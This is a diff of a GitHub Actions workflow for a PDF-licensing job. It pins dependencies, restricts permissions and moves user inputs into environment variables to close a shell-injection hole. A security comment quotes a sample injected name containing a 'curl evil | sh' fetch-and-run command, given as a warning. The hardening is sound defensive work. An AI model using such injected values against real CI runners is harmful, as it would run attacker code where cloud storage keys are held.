@@ -35,10 +35,23 @@ on:
         description: 'Callback URL to report completion'
         required: true
         type: string
+      licenseId:
+        description: 'License ID printed on every page and logged in DownloadLog'
+        required: true
+        type: string
+      issuedAt:
+        description: 'ISO timestamp the license was issued'
+        required: true
+        type: string
+
+# Nothing here needs to write to the repository.
+permissions:
+  contents: read
 
 jobs:
   process-pdf:
     runs-on: ubuntu-latest
+    timeout-minutes: 30
 
     steps:
       - name: Checkout repository
@@ -47,26 +60,32 @@ jobs:
       - name: Setup Node.js
         uses: actions/setup-node@v4
         with:
-          node-version: 18
+          node-version: 22
+          cache: npm
 
+      # Installs exactly what package-lock.json pins (the old step did an unpinned `npm install <pkgs>`).
       - name: Install dependencies
-        run: |
-          npm install @aws-sdk/client-s3 pdf-lib bwip-js @pdfsmaller/pdf-encrypt-lite axios
+        run: npm ci --omit=dev
 
       - name: Run PDF Processor Script
+        # SECURITY: every user-controlled value goes through `env:` and is read with process.env in the
+        # script. Never write ${{ inputs.* }} inside a `run:` line - GitHub substitutes it into the shell
+        # script text BEFORE the shell parses it, so a student whose name contains  "; curl evil | sh; "
+        # would run arbitrary commands on this runner (which holds the R2 keys).
         env:
           CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
           CLOUDFLARE_ACCESS_KEY_ID: ${{ secrets.CLOUDFLARE_ACCESS_KEY_ID }}
           CLOUDFLARE_SECRET_ACCESS_KEY: ${{ secrets.CLOUDFLARE_SECRET_ACCESS_KEY }}
           R2_BUCKET_NAME: ${{ secrets.R2_BUCKET_NAME }}
           CALLBACK_SECRET: ${{ secrets.CALLBACK_SECRET }}
-        run: |
-          node scripts/process-pdf.js \
-            --courseId="${{ inputs.courseId }}" \
-            --userId="${{ inputs.userId }}" \
-            --userName="${{ inputs.userName }}" \
-            --userEmail="${{ inputs.userEmail }}" \
-            --userMobile="${{ inputs.userMobile }}" \
-            --sourceKey="${{ inputs.sourceKey }}" \
-            --destinationKey="${{ inputs.destinationKey }}" \
-            --callbackUrl="${{ inputs.callbackUrl }}"
+          PDF_COURSE_ID: ${{ inputs.courseId }}
+          PDF_USER_ID: ${{ inputs.userId }}
+          PDF_USER_NAME: ${{ inputs.userName }}
+          PDF_USER_EMAIL: ${{ inputs.userEmail }}
+          PDF_USER_MOBILE: ${{ inputs.userMobile }}
+          PDF_SOURCE_KEY: ${{ inputs.sourceKey }}
+          PDF_DESTINATION_KEY: ${{ inputs.destinationKey }}
+          PDF_CALLBACK_URL: ${{ inputs.callbackUrl }}
+          PDF_LICENSE_ID: ${{ inputs.licenseId }}
+          PDF_ISSUED_AT: ${{ inputs.issuedAt }}
+        run: node scripts/process-pdf.js
